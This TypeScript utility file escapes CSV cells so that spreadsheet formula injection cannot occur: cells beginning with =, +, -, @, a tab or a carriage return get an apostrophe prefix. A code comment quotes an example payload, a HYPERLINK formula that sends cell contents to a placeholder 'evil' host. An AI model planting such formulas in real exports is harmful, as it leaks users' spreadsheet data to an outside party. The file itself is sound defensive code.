// A cell starting with = + - @ (or a tab/CR, which Excel strips first) is
// run as a formula when the CSV is opened in Excel/Sheets — e.g. a theme
// named =HYPERLINK("https://evil/?"&A1,"x") would send cell data off-site.
// Prefixing an apostrophe makes the spreadsheet show it as plain text.
const FORMULA_START_RE = /^[=+\-@\t\r]/;

/**
 * Always-quoted cell for the browser-built CSV downloads (demo-store tabs, analytics installs). Strings get the same
 * formula guard as escapeCsvField; numbers are real numbers (a negative one must not get an apostrophe).
 */
export function csvCell(value: string | number | null | undefined): string {
  if (typeof value === "number") return `"${value}"`;
  const text = String(value ?? "");
  const safe = FORMULA_START_RE.test(text) ? `'${text}` : text;
  return `"${safe.replace(/"/g, '""')}"`;
}

export function escapeCsvField(value: string): string {
  const safe = FORMULA_START_RE.test(value) ? `'${value}` : value;
  if (/[",\n\r]/.test(safe)) {
    return `"${safe.replace(/"/g, '""')}"`;
  }
  return safe;
}
